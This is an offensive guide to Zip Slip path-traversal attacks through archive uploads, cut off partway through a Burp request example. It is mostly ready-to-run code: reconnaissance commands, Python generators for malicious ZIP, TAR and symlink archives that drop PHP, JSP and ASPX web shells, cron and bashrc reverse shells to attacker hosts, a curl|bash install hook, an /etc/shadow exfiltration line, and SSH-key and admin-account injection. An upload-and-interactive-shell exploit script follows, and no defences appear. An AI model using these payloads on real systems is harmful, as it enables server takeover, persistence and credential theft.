---
title: Zip Slip - Path Traversal via Uploads
description: Zip Slip - Path Traversal via Uploads
navigation:
  icon: i-lucide-file-archive
  title: Zip Slip - Path Traversal via Uploads
---

## Zip Slip — Path Traversal via Uploads

::badge
**Critical Severity — CWE-22 / CWE-23 / CWE-73**
::

::note
Zip Slip is a vulnerability class where an application extracts archive files (ZIP, TAR, JAR, WAR, CPIO, APK, RAR, 7z) without validating the file paths inside. An attacker crafts an archive containing entries with directory traversal sequences like `../../../etc/cron.d/reverse` — when the server extracts it, files land outside the intended directory, enabling **Remote Code Execution**, **config overwrite**, **SSH key injection**, and **cron job planting**.
::

---

## Vulnerability Anatomy

::accordion
  :::accordion-item{icon="i-lucide-bug" label="How Zip Slip Works"}
  1. The application accepts a ZIP/TAR upload
  2. Backend extracts the archive into a temporary or web-accessible directory
  3. Archive entries contain path traversal filenames like `../../../../var/www/html/shell.php`
  4. The extraction routine does not sanitize the destination path
  5. Malicious file is written outside the upload directory
  6. Attacker accesses the file to trigger code execution
  :::

  :::accordion-item{icon="i-lucide-shield-alert" label="Why It Happens"}
  - Server-side code trusts filenames inside archives without validation
  - Use of vulnerable extraction libraries (e.g., old `ZipInputStream` in Java, `extractall()` in Python without checks)
  - No canonicalization of resolved paths before writing
  - Symbolic link following during extraction
  - Lack of chroot or sandboxing on extraction directory
  :::

  :::accordion-item{icon="i-lucide-target" label="Impact Scenarios"}
  - **RCE** — Overwrite web shell into document root
  - **SSH Access** — Write `authorized_keys` to `~/.ssh/`
  - **Cron Backdoor** — Drop reverse shell script into `/etc/cron.d/`
  - **Config Poisoning** — Overwrite `.env`, `wp-config.php`, `settings.py`
  - **Binary Replacement** — Replace system binaries or application executables
  - **Log Injection** — Overwrite log files for log poisoning chains
  :::

  :::accordion-item{icon="i-lucide-search" label="Affected Archive Formats"}
  | Format | Extension | Common In |
  | ------ | --------- | --------- |
  | ZIP | `.zip` | Web apps, Java, PHP, Python |
  | TAR | `.tar`, `.tar.gz`, `.tgz` | Linux, Node.js, Python |
  | JAR | `.jar` | Java applications |
  | WAR | `.war` | Java servlet containers |
  | APK | `.apk` | Android applications |
  | CPIO | `.cpio` | RPM packages, Linux |
  | RAR | `.rar` | Windows applications |
  | 7z | `.7z` | Cross-platform tools |
  | AR | `.ar`, `.deb` | Debian packages |
  :::
::

---

## Reconnaissance & Target Identification

::tip
Before crafting payloads, identify upload endpoints that accept archive files and understand how the server processes them.
::

### Endpoint Discovery

::tabs
  :::tabs-item{icon="i-lucide-radar" label="Automated Crawling"}
  ```bash
  # Crawl for upload forms accepting archives
  gospider -s https://target.com -d 3 -c 10 | grep -iE "upload|import|extract|unzip|decompress"

  # Nuclei template scan for file upload endpoints
  nuclei -u https://target.com -t http/vulnerabilities/file-upload/ -severity critical,high

  # Ffuf for hidden upload endpoints
  ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api-endpoints.txt -mc 200,301,302,405 -fc 404 | grep -iE "upload|import|extract|bulk|batch|restore|backup|migrate"

  # Katana deep crawl
  katana -u https://target.com -d 5 -jc -kf -ef css,js,png,jpg -o endpoints.txt
  grep -iE "upload|import|zip|tar|archive|extract|restore|backup" endpoints.txt
  ```
  :::

  :::tabs-item{icon="i-lucide-file-search" label="Manual Indicators"}
  ```bash
  # Common upload paths to probe
  curl -s -o /dev/null -w "%{http_code}" https://target.com/api/upload
  curl -s -o /dev/null -w "%{http_code}" https://target.com/api/v1/import
  curl -s -o /dev/null -w "%{http_code}" https://target.com/admin/restore
  curl -s -o /dev/null -w "%{http_code}" https://target.com/admin/backup/upload
  curl -s -o /dev/null -w "%{http_code}" https://target.com/api/bulk-import
  curl -s -o /dev/null -w "%{http_code}" https://target.com/api/theme/upload
  curl -s -o /dev/null -w "%{http_code}" https://target.com/api/plugin/install
  curl -s -o /dev/null -w "%{http_code}" https://target.com/settings/import
  curl -s -o /dev/null -w "%{http_code}" https://target.com/data/migrate
  curl -s -o /dev/null -w "%{http_code}" https://target.com/api/extract
  curl -s -o /dev/null -w "%{http_code}" https://target.com/upload/archive
  curl -s -o /dev/null -w "%{http_code}" https://target.com/file/decompress

  # Wordlist-based discovery
  ffuf -u https://target.com/FUZZ -w <(echo -e "upload\nimport\nextract\nrestore\nbackup\nbulk\nmigrate\ndecompress\nunzip\nuntar\narchive\ntheme/upload\nplugin/upload\ndata/import\napi/upload\napi/import\nadmin/upload\nadmin/import\nsettings/import\nconfig/restore") -mc 200,301,302,401,403,405
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Burp Suite Patterns"}
  ```text
  # Burp Suite search filters for proxy history
  # Search in Request body:
  Content-Type: multipart/form-data
  Content-Disposition: filename=
  .zip
  .tar
  .gz
  .jar
  .war

  # Search in Response body:
  "extracted"
  "unzipped"
  "decompressed"
  "archive processed"
  "files imported"
  "upload successful"
  "extraction complete"

  # Burp Intruder — fuzz parameter names
  file
  archive
  zipfile
  tarfile
  import_file
  backup_file
  data_file
  upload_file
  attachment
  package
  bundle
  ```
  :::
::

### Technology Fingerprinting

::collapsible
```bash
# Identify backend technology (affects payload strategy)
whatweb https://target.com -v
wappalyzer-cli https://target.com

# HTTP headers reveal frameworks
curl -sI https://target.com | grep -iE "x-powered-by|server|x-aspnet|x-generator"

# Technology-specific archive handling libraries
# Java:  ZipInputStream, ZipFile, java.util.zip, Apache Commons Compress
# Python: zipfile.extractall(), tarfile.extractall(), shutil.unpack_archive()
# Node.js: adm-zip, unzipper, yauzl, tar, decompress
# PHP: ZipArchive::extractTo(), PclZip
# Ruby: Zip::File, Archive::Zip
# Go: archive/zip, archive/tar
# .NET: System.IO.Compression, ZipFile.ExtractToDirectory()

# Check for known vulnerable library versions
curl -s https://target.com/package.json 2>/dev/null | jq '.dependencies' | grep -iE "adm-zip|unzipper|decompress|tar|archiver"
curl -s https://target.com/pom.xml 2>/dev/null | grep -iE "commons-compress|zip4j"
curl -s https://target.com/requirements.txt 2>/dev/null | grep -iE "zipfile|tarfile"
curl -s https://target.com/Gemfile 2>/dev/null | grep -iE "rubyzip|zip"
```
::

---

## Malicious Archive Crafting

::warning
The core of Zip Slip exploitation is crafting archives with directory traversal filenames. Multiple tools and techniques exist depending on target OS, backend language, and extraction behavior.
::

### Python — Primary Crafting Method

::tabs
  :::tabs-item{icon="i-lucide-file-code" label="ZIP Payloads"}
  ```python [zipslip_craft.py]
  #!/usr/bin/env python3
  """Zip Slip payload generator — ZIP format"""
  import zipfile
  import io
  import sys
  import os

  def create_zipslip(output_file, traversal_path, payload_content, decoy=True):
      """Create a ZIP with path traversal entry"""
      with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zf:
          # Add decoy legitimate file
          if decoy:
              zf.writestr("readme.txt", "This is a legitimate file.")
              zf.writestr("data/config.json", '{"version": "1.0"}')
          
          # Add malicious traversal entry
          zf.writestr(traversal_path, payload_content)
      
      print(f"[+] Created: {output_file}")
      print(f"[+] Traversal path: {traversal_path}")
      print(f"[+] Payload size: {len(payload_content)} bytes")

  # ── PHP Web Shell ──
  create_zipslip(
      "zipslip_php.zip",
      "../../../var/www/html/cmd.php",
      '<?php echo shell_exec($_GET["cmd"]); ?>'
  )

  # ── JSP Web Shell ──
  create_zipslip(
      "zipslip_jsp.zip",
      "../../../opt/tomcat/webapps/ROOT/cmd.jsp",
      '''<%@ page import="java.util.*,java.io.*"%>
  <%
  String cmd = request.getParameter("cmd");
  if (cmd != null) {
      Process p = Runtime.getRuntime().exec(cmd);
      BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
      String line;
      while ((line = br.readLine()) != null) out.println(line);
  }
  %>'''
  )

  # ── ASPX Web Shell ──
  create_zipslip(
      "zipslip_aspx.zip",
      "..\\..\\..\\inetpub\\wwwroot\\cmd.aspx",
      '''<%@ Page Language="C#" %>
  <%@ Import Namespace="System.Diagnostics" %>
  <script runat="server">
  protected void Page_Load(object sender, EventArgs e) {
      string cmd = Request.QueryString["cmd"];
      if (cmd != null) {
          Process p = new Process();
          p.StartInfo.FileName = "cmd.exe";
          p.StartInfo.Arguments = "/c " + cmd;
          p.StartInfo.RedirectStandardOutput = true;
          p.StartInfo.UseShellExecute = false;
          p.Start();
          Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
      }
  }
  </script>'''
  )

  # ── Python (Jinja2 SSTI via overwrite) ──
  create_zipslip(
      "zipslip_ssti.zip",
      "../../../app/templates/index.html",
      '{{ config.__class__.__init__.__globals__["os"].popen(request.args.get("cmd")).read() }}'
  )

  # ── SSH Authorized Keys ──
  create_zipslip(
      "zipslip_ssh.zip",
      "../../../../../root/.ssh/authorized_keys",
      "ssh-rsa AAAAB3NzaC1yc2EAAAA... attacker@kali"
  )

  # ── Cron Reverse Shell ──
  create_zipslip(
      "zipslip_cron.zip",
      "../../../etc/cron.d/revshell",
      "* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'\n"
  )

  # ── .env Overwrite ──
  create_zipslip(
      "zipslip_env.zip",
      "../../../app/.env",
      """APP_KEY=base64:ATTACKER_CONTROLLED_KEY
  DB_HOST=attacker.com
  DB_DATABASE=stolen
  DB_USERNAME=root
  DB_PASSWORD=toor
  MAIL_HOST=attacker.com
  AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
  AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
  """
  )
  ```
  :::

  :::tabs-item{icon="i-lucide-file-code" label="TAR Payloads"}
  ```python [tarslip_craft.py]
  #!/usr/bin/env python3
  """Zip Slip payload generator — TAR format"""
  import tarfile
  import io
  import os

  def create_tarslip(output_file, traversal_path, payload_content, compress="gz"):
      """Create a TAR with path traversal entry"""
      mode = f"w:{compress}" if compress else "w"
      ext = f".{compress}" if compress else ""
      
      with tarfile.open(output_file, mode) as tf:
          # Add decoy
          decoy = tarfile.TarInfo(name="readme.txt")
          decoy_data = b"Legitimate archive content"
          decoy.size = len(decoy_data)
          tf.addfile(decoy, io.BytesIO(decoy_data))
          
          # Add malicious entry
          info = tarfile.TarInfo(name=traversal_path)
          payload_bytes = payload_content.encode() if isinstance(payload_content, str) else payload_content
          info.size = len(payload_bytes)
          info.mode = 0o755
          tf.addfile(info, io.BytesIO(payload_bytes))
      
      print(f"[+] Created: {output_file}")
      print(f"[+] Traversal: {traversal_path}")

  # ── PHP Shell via TAR.GZ ──
  create_tarslip(
      "tarslip_php.tar.gz",
      "../../../var/www/html/shell.php",
      '<?php system($_REQUEST["cmd"]); ?>'
  )

  # ── Bash reverse shell via cron ──
  create_tarslip(
      "tarslip_cron.tar.gz",
      "../../../etc/cron.d/backdoor",
      "* * * * * root bash -c 'bash -i >& /dev/tcp/10.10.14.1/9001 0>&1'\n"
  )

  # ── Overwrite /etc/passwd (add root user) ──
  create_tarslip(
      "tarslip_passwd.tar.gz",
      "../../../etc/passwd",
      "root:x:0:0:root:/root:/bin/bash\nhacker:$1$salt$hash:0:0:hacker:/root:/bin/bash\n"
  )

  # ── Node.js RCE via package.json overwrite ──
  create_tarslip(
      "tarslip_npm.tar.gz",
      "../../../app/package.json",
      '''{
    "name": "pwned",
    "scripts": {
      "preinstall": "curl http://ATTACKER/shell.sh | bash"
    }
  }'''
  )

  # ── Uncompressed TAR ──
  create_tarslip(
      "tarslip_raw.tar",
      "../../../var/www/html/backdoor.php",
      '<?php passthru($_GET["c"]); ?>',
      compress=None
  )

  # ── BZ2 compressed TAR ──
  create_tarslip(
      "tarslip_bz2.tar.bz2",
      "../../../var/www/html/x.php",
      '<?php eval($_POST["e"]); ?>',
      compress="bz2"
  )
  ```
  :::

  :::tabs-item{icon="i-lucide-file-code" label="Symlink Payloads"}
  ```python [symlink_craft.py]
  #!/usr/bin/env python3
  """Symlink-based archive traversal payloads"""
  import tarfile
  import zipfile
  import io
  import os

  def create_tar_symlink(output_file, link_name, link_target):
      """Create TAR with symlink pointing outside extraction dir"""
      with tarfile.open(output_file, "w:gz") as tf:
          # Create symlink entry
          info = tarfile.TarInfo(name=link_name)
          info.type = tarfile.SYMTYPE
          info.linkname = link_target
          tf.addfile(info)
      
      print(f"[+] Symlink TAR: {output_file}")
      print(f"[+] {link_name} -> {link_target}")

  def create_tar_symlink_chain(output_file, symlink_name, symlink_target, file_via_symlink, payload):
      """Two-stage symlink attack: create symlink then write through it"""
      with tarfile.open(output_file, "w:gz") as tf:
          # Stage 1: Symlink to target directory
          sym = tarfile.TarInfo(name=symlink_name)
          sym.type = tarfile.SYMTYPE
          sym.linkname = symlink_target
          tf.addfile(sym)
          
          # Stage 2: File that resolves through symlink
          payload_bytes = payload.encode()
          info = tarfile.TarInfo(name=file_via_symlink)
          info.size = len(payload_bytes)
          info.mode = 0o755
          tf.addfile(info, io.BytesIO(payload_bytes))
      
      print(f"[+] Symlink chain TAR: {output_file}")

  # ── Read /etc/passwd via symlink ──
  create_tar_symlink(
      "symlink_read_passwd.tar.gz",
      "passwd_link",
      "/etc/passwd"
  )

  # ── Read /etc/shadow via symlink ──
  create_tar_symlink(
      "symlink_read_shadow.tar.gz",
      "shadow_link",
      "/etc/shadow"
  )

  # ── Symlink to web root then write shell ──
  create_tar_symlink_chain(
      "symlink_chain_rce.tar.gz",
      "webroot",                           # symlink name
      "/var/www/html",                     # symlink target
      "webroot/backdoor.php",              # file written through symlink
      '<?php system($_GET["cmd"]); ?>'     # payload content
  )

  # ── Symlink to /root/.ssh then write key ──
  create_tar_symlink_chain(
      "symlink_chain_ssh.tar.gz",
      "ssh_dir",
      "/root/.ssh",
      "ssh_dir/authorized_keys",
      "ssh-rsa AAAAB3NzaC1yc2EAAAA... attacker@kali"
  )

  # ── Symlink to /etc/cron.d then plant cron ──
  create_tar_symlink_chain(
      "symlink_chain_cron.tar.gz",
      "cron_dir",
      "/etc/cron.d",
      "cron_dir/reverse",
      "* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.1/4444 0>&1'\n"
  )

  # ── Hardlink-based file read ──
  def create_tar_hardlink(output_file, link_name, link_target):
      """Create TAR with hardlink to read arbitrary files"""
      with tarfile.open(output_file, "w:gz") as tf:
          info = tarfile.TarInfo(name=link_name)
          info.type = tarfile.LNKTYPE
          info.linkname = link_target
          tf.addfile(info)
      
      print(f"[+] Hardlink TAR: {output_file}")

  create_tar_hardlink("hardlink_etc_passwd.tar.gz", "stolen_passwd", "/etc/passwd")
  create_tar_hardlink("hardlink_shadow.tar.gz", "stolen_shadow", "/etc/shadow")
  create_tar_hardlink("hardlink_env.tar.gz", "stolen_env", "/app/.env")
  ```
  :::
::

### CLI-Based Quick Crafting

::code-group
```bash [One-Liner ZIP]
# Python one-liner to create Zip Slip payload
python3 -c "
import zipfile
with zipfile.ZipFile('evil.zip','w') as z:
    z.writestr('../../../var/www/html/shell.php','<?php system(\$_GET[\"c\"]); ?>')
    z.writestr('legit.txt','normal file')
"

# Verify archive contents
unzip -l evil.zip
zipinfo evil.zip
python3 -c "import zipfile; [print(f.filename) for f in zipfile.ZipFile('evil.zip').infolist()]"
```

```bash [One-Liner TAR]
# Create TAR with traversal using Python
python3 -c "
import tarfile, io
with tarfile.open('evil.tar.gz','w:gz') as t:
    i=tarfile.TarInfo('../../var/www/html/cmd.php')
    d=b'<?php passthru(\$_GET[\"c\"]); ?>'
    i.size=len(d)
    t.addfile(i,io.BytesIO(d))
"

# Verify
tar tzvf evil.tar.gz
python3 -c "import tarfile; [print(m.name) for m in tarfile.open('evil.tar.gz')]"
```

```bash [Symlink via CLI]
# Create symlink-based TAR from command line
cd /tmp && mkdir zipslip_work && cd zipslip_work

# Method 1: Direct symlink creation
ln -s /etc/passwd link_to_passwd
tar czf ../symlink_passwd.tar.gz link_to_passwd
rm link_to_passwd

# Method 2: Symlink to directory + file through it
ln -s /var/www/html webroot_link
mkdir -p fake_webroot
echo '<?php system($_GET["cmd"]); ?>' > fake_webroot/shell.php
tar czf ../symlink_rce.tar.gz webroot_link -C fake_webroot shell.php

# Method 3: Using GNU tar --transform for path manipulation
echo '<?php system($_GET["c"]); ?>' > shell.php
tar czf evil_transform.tar.gz --transform='s|shell.php|../../../var/www/html/shell.php|' shell.php

cd / && rm -rf /tmp/zipslip_work
```

```bash [evilarc Tool]
# evilarc — dedicated Zip Slip crafting tool
# https://github.com/ptoomey3/evilarc
git clone https://github.com/ptoomey3/evilarc.git
cd evilarc

# Create malicious ZIP with traversal
echo '<?php system($_GET["cmd"]); ?>' > shell.php
python2 evilarc.py shell.php -o unix -p "var/www/html" -d 5 -f evil.zip

# Flags:
# -o unix|win     — Target OS (path separator)
# -p <path>       — Target path (relative from root)
# -d <depth>      — Number of ../ traversals  
# -f <filename>   — Output archive name
# -t zip|tar|jar  — Archive type

# More examples
python2 evilarc.py shell.php -o unix -p "opt/tomcat/webapps/ROOT" -d 8 -f evil_tomcat.zip
python2 evilarc.py shell.jsp -o unix -p "opt/tomcat/webapps/ROOT" -d 5 -t zip -f evil.zip
python2 evilarc.py shell.aspx -o win -p "inetpub\\wwwroot" -d 5 -f evil_iis.zip
python2 evilarc.py shell.php -o unix -p "var/www/html" -d 10 -t tar -f evil.tar
```
::

### Advanced Multi-Entry Payloads

::code-collapse
```python [multi_payload_crafter.py]
#!/usr/bin/env python3
"""
Advanced multi-entry Zip Slip payload crafter
Generates archives with multiple traversal paths targeting different services
"""
import zipfile
import tarfile
import io
import sys
import os
import struct

class ZipSlipCrafter:
    def __init__(self):
        self.entries = []
    
    def add_entry(self, path, content, description=""):
        self.entries.append({
            "path": path,
            "content": content if isinstance(content, bytes) else content.encode(),
            "desc": description
        })
    
    def build_zip(self, output):
        with zipfile.ZipFile(output, 'w', zipfile.ZIP_DEFLATED) as zf:
            # Always add decoy
            zf.writestr("README.md", "# Import Data\nThis archive contains configuration data.")
            zf.writestr("data/placeholder.json", '{"status": "ok"}')
            for entry in self.entries:
                zf.writestr(entry["path"], entry["content"])
        self._report(output)
    
    def build_tar(self, output, compress="gz"):
        mode = f"w:{compress}" if compress else "w"
        with tarfile.open(output, mode) as tf:
            for entry in self.entries:
                info = tarfile.TarInfo(name=entry["path"])
                info.size = len(entry["content"])
                info.mode = 0o755
                tf.addfile(info, io.BytesIO(entry["content"]))
        self._report(output)
    
    def _report(self, output):
        print(f"\n[+] Archive: {output}")
        print(f"[+] Entries: {len(self.entries)}")
        for e in self.entries:
            print(f"    → {e['path']} ({e['desc']})")

# ── Full Attack Suite — Linux Target ──
linux = ZipSlipCrafter()

linux.add_entry(
    "../../../var/www/html/shell.php",
    '<?php if(isset($_REQUEST["cmd"])){echo "<pre>".shell_exec($_REQUEST["cmd"])."</pre>";} ?>',
    "PHP webshell in Apache docroot"
)
linux.add_entry(
    "../../../var/www/html/.htaccess",
    "AddType application/x-httpd-php .txt\nAddType application/x-httpd-php .jpg\n",
    "htaccess to execute PHP from .txt/.jpg"
)
linux.add_entry(
    "../../../root/.ssh/authorized_keys",
    "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7... attacker@kali",
    "SSH key for root access"
)
linux.add_entry(
    "../../../etc/cron.d/backdoor",
    "* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.1/9001 0>&1'\n",
    "Cron-based reverse shell"
)
linux.add_entry(
    "../../../home/app/.bashrc",
    '\n/bin/bash -c "bash -i >& /dev/tcp/10.10.14.1/9002 0>&1" &\n',
    "Bashrc persistence"
)
linux.add_entry(
    "../../../app/.env",
    "DATABASE_URL=postgresql://attacker.com:5432/exfil\nSECRET_KEY=attacker_controlled\n",
    "Environment variable hijack"
)
linux.add_entry(
    "../../../usr/local/bin/backup.sh",
    "#!/bin/bash\ncurl http://10.10.14.1/exfil?data=$(cat /etc/shadow | base64 -w0)\n",
    "Backup script replacement"
)

linux.build_zip("full_attack_linux.zip")
linux.build_tar("full_attack_linux.tar.gz")

# ── Full Attack Suite — Windows Target ──
windows = ZipSlipCrafter()

windows.add_entry(
    "..\\..\\..\\inetpub\\wwwroot\\cmd.aspx",
    '''<%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
protected void Page_Load(object s, EventArgs e) {
    string c = Request["cmd"];
    if (c != null) {
        ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + c);
        psi.RedirectStandardOutput = true;
        psi.UseShellExecute = false;
        Process p = Process.Start(psi);
        Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
    }
}
</script>''',
    "ASPX webshell in IIS wwwroot"
)

windows.add_entry(
    "..\\..\\..\\inetpub\\wwwroot\\web.config",
    '''<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers>
      <add name="aspx" path="*.txt" verb="*" type="System.Web.UI.PageHandlerFactory" />
    </handlers>
  </system.webServer>
</configuration>''',
    "web.config handler injection"
)

windows.add_entry(
    "..\\..\\..\\Users\\Administrator\\.ssh\\authorized_keys",
    "ssh-rsa AAAAB3NzaC1yc2EAAAA... attacker@kali",
    "SSH key for Administrator"
)

windows.build_zip("full_attack_windows.zip")

# ── Full Attack Suite — Java/Tomcat Target ──
java = ZipSlipCrafter()

java.add_entry(
    "../../../opt/tomcat/webapps/ROOT/cmd.jsp",
    '''<%@ page import="java.util.*,java.io.*"%>
<%
String c = request.getParameter("cmd");
if (c != null) {
    Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",c});
    Scanner s = new Scanner(p.getInputStream()).useDelimiter("\\\\A");
    out.println("<pre>" + (s.hasNext() ? s.next() : "") + "</pre>");
}
%>''',
    "JSP webshell in Tomcat ROOT"
)

java.add_entry(
    "../../../opt/tomcat/conf/tomcat-users.xml",
    '''<?xml version="1.0" encoding="UTF-8"?>
<tomcat-users>
  <role rolename="manager-gui"/>
  <role rolename="admin-gui"/>
  <user username="hacker" password="hacker123" roles="manager-gui,admin-gui"/>
</tomcat-users>''',
    "Tomcat manager credential injection"
)

java.build_zip("full_attack_java.zip")
java.build_tar("full_attack_java.tar.gz")
```
::

---

## Traversal Path Reference

::caution
The correct traversal depth depends on where the extraction directory is relative to the target write location. Test multiple depths when the exact path is unknown.
::

### Linux Target Paths

::collapsible
| Target | Traversal Path | Purpose |
| ------ | -------------- | ------- |
| Apache docroot | `../../../var/www/html/shell.php` | PHP RCE |
| Nginx docroot | `../../../usr/share/nginx/html/shell.php` | PHP RCE |
| Tomcat ROOT | `../../../opt/tomcat/webapps/ROOT/cmd.jsp` | JSP RCE |
| Tomcat config | `../../../opt/tomcat/conf/tomcat-users.xml` | Admin creds |
| Flask templates | `../../../app/templates/base.html` | SSTI chain |
| Django settings | `../../../app/settings.py` | Config overwrite |
| Laravel `.env` | `../../../var/www/laravel/.env` | Secret leak |
| Rails config | `../../../app/config/database.yml` | DB creds |
| SSH root key | `../../../../../root/.ssh/authorized_keys` | SSH access |
| SSH user key | `../../../../../home/user/.ssh/authorized_keys` | SSH access |
| Cron job | `../../../etc/cron.d/backdoor` | Scheduled RCE |
| Crontab | `../../../var/spool/cron/crontabs/root` | Root cron |
| Sudoers | `../../../etc/sudoers.d/backdoor` | Privilege escalation |
| Passwd | `../../../etc/passwd` | User injection |
| Shadow | `../../../etc/shadow` | Password theft |
| Bashrc | `../../../../../root/.bashrc` | Login persistence |
| Profile | `../../../etc/profile.d/backdoor.sh` | System-wide persistence |
| Systemd service | `../../../etc/systemd/system/backdoor.service` | Service persistence |
| Init.d | `../../../etc/init.d/backdoor` | Boot persistence |
| WordPress config | `../../../var/www/html/wp-config.php` | DB creds |
| htaccess | `../../../var/www/html/.htaccess` | Handler override |
| Node.js entry | `../../../app/index.js` | Code overwrite |
| Python app | `../../../app/app.py` | Code overwrite |
| PM2 ecosystem | `../../../app/ecosystem.config.js` | Process manager hijack |
| Docker socket | `../../../var/run/docker.sock` | Container escape |
| Kubernetes config | `../../../../../root/.kube/config` | Cluster access |
::

### Windows Target Paths

::collapsible
| Target | Traversal Path | Purpose |
| ------ | -------------- | ------- |
| IIS wwwroot | `..\..\..\..\inetpub\wwwroot\cmd.aspx` | ASPX RCE |
| IIS web.config | `..\..\..\..\inetpub\wwwroot\web.config` | Handler injection |
| Apache (XAMPP) | `..\..\..\..\xampp\htdocs\shell.php` | PHP RCE |
| Tomcat (Windows) | `..\..\..\..\Program Files\Apache\Tomcat\webapps\ROOT\cmd.jsp` | JSP RCE |
| SSH key | `..\..\..\..\Users\Administrator\.ssh\authorized_keys` | SSH access |
| Startup folder | `..\..\..\..\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\evil.bat` | Boot persistence |
| Hosts file | `..\..\..\..\Windows\System32\drivers\etc\hosts` | DNS hijack |
| PowerShell profile | `..\..\..\..\Users\Administrator\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1` | PS persistence |
| Scheduled tasks | `..\..\..\..\Windows\System32\Tasks\backdoor` | Task persistence |
::

---

## Delivery & Exploitation

### HTTP Upload Delivery

::tabs
  :::tabs-item{icon="i-lucide-upload" label="cURL Uploads"}
  ```bash
  # ── Standard multipart upload ──
  curl -X POST https://target.com/api/upload \
    -F "file=@evil.zip" \
    -H "Cookie: session=AUTH_TOKEN" \
    -v

  # ── With custom filename ──
  curl -X POST https://target.com/api/import \
    -F "file=@evil.zip;filename=data_export.zip" \
    -H "Cookie: session=AUTH_TOKEN"

  # ── With additional form parameters ──
  curl -X POST https://target.com/admin/restore \
    -F "backup=@evil.tar.gz" \
    -F "overwrite=true" \
    -F "extract=true" \
    -H "Cookie: session=AUTH_TOKEN"

  # ── PUT method upload ──
  curl -X PUT https://target.com/api/upload/archive \
    --data-binary @evil.zip \
    -H "Content-Type: application/zip" \
    -H "Cookie: session=AUTH_TOKEN"

  # ── Base64 encoded in JSON body ──
  BASE64_ZIP=$(base64 -w0 evil.zip)
  curl -X POST https://target.com/api/import \
    -H "Content-Type: application/json" \
    -H "Cookie: session=AUTH_TOKEN" \
    -d "{\"filename\":\"data.zip\",\"content\":\"${BASE64_ZIP}\"}"

  # ── Chunked transfer encoding ──
  curl -X POST https://target.com/api/upload \
    -F "file=@evil.zip" \
    -H "Transfer-Encoding: chunked" \
    -H "Cookie: session=AUTH_TOKEN"

  # ── Through API with token auth ──
  curl -X POST https://target.com/api/v2/files/upload \
    -F "archive=@evil.zip" \
    -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIs..." \
    -H "X-Requested-With: XMLHttpRequest"
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Python Requests"}
  ```python [exploit_upload.py]
  #!/usr/bin/env python3
  """Automated Zip Slip upload and verification"""
  import requests
  import sys
  import time
  import urllib3
  urllib3.disable_warnings()

  class ZipSlipExploit:
      def __init__(self, target, session_cookie=None, auth_token=None):
          self.target = target.rstrip('/')
          self.session = requests.Session()
          self.session.verify = False
          
          if session_cookie:
              self.session.cookies.set('session', session_cookie)
          if auth_token:
              self.session.headers['Authorization'] = f'Bearer {auth_token}'
      
      def upload(self, endpoint, file_path, field_name='file'):
          """Upload malicious archive"""
          url = f"{self.target}{endpoint}"
          print(f"[*] Uploading to: {url}")
          
          with open(file_path, 'rb') as f:
              files = {field_name: (file_path.split('/')[-1], f, 'application/zip')}
              r = self.session.post(url, files=files)
          
          print(f"[*] Status: {r.status_code}")
          print(f"[*] Response: {r.text[:500]}")
          return r
      
      def verify_shell(self, shell_path, cmd="id"):
          """Verify webshell was written successfully"""
          url = f"{self.target}{shell_path}"
          print(f"\n[*] Verifying shell at: {url}")
          
          # Try different parameter names
          for param in ['cmd', 'c', 'command', 'exec']:
              try:
                  r = self.session.get(url, params={param: cmd}, timeout=10)
                  if r.status_code == 200 and ('uid=' in r.text or 'root' in r.text.lower()):
                      print(f"[+] SHELL VERIFIED! Parameter: {param}")
                      print(f"[+] Output: {r.text.strip()}")
                      return True, param
              except:
                  continue
          
          print("[-] Shell not accessible or not working")
          return False, None
      
      def interactive_shell(self, shell_path, param='cmd'):
          """Drop into interactive shell"""
          url = f"{self.target}{shell_path}"
          print(f"\n[*] Interactive shell on {url}")
          print("[*] Type 'exit' to quit\n")
          
          while True:
              cmd = input("$ ")
              if cmd.lower() in ('exit', 'quit'):
                  break
              try:
                  r = self.session.get(url, params={param: cmd}, timeout=15)
                  print(r.text.strip())
              except Exception as e:
                  print(f"Error: {e}")
      
      def spray_endpoints(self, file_path, endpoints=None):
          """Try uploading to multiple endpoints"""
          if endpoints is None:
              endpoints = [
                  '/api/upload', '/api/v1/upload', '/api/v2/upload',
                  '/api/import', '/api/v1/import', '/upload',
                  '/admin/upload', '/admin/import', '/admin/restore',
                  '/api/files/upload', '/api/archive/upload',
                  '/settings/import', '/config/restore',
                  '/api/bulk-import', '/api/data/import',
                  '/plugin/upload', '/theme/upload',
                  '/backup/restore', '/migration/import'
              ]
          
          for endpoint in endpoints:
              try:
                  r = self.upload(endpoint, file_path)
                  if r.status_code in [200, 201, 202]:
                      print(f"\n[+] POTENTIAL SUCCESS: {endpoint}")
              except Exception as e:
                  print(f"[-] {endpoint}: {e}")

  # ── Usage ──
  if __name__ == "__main__":
      exploit = ZipSlipExploit(
          target="https://target.com",
          session_cookie="your_session_cookie_here"
      )
      
      # Upload malicious archive
      exploit.upload("/api/upload", "evil.zip")
      
      # Verify shell
      time.sleep(2)
      success, param = exploit.verify_shell("/shell.php")
      
      # Interactive shell if successful
      if success:
          exploit.interactive_shell("/shell.php", param)
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Burp Suite"}
  ```text
  # ── Burp Repeater — Manual Upload ──
  POST /api/upload HTTP/1.1
  Host: target.com
  Cookie: session=AUTH_TOKEN_HERE
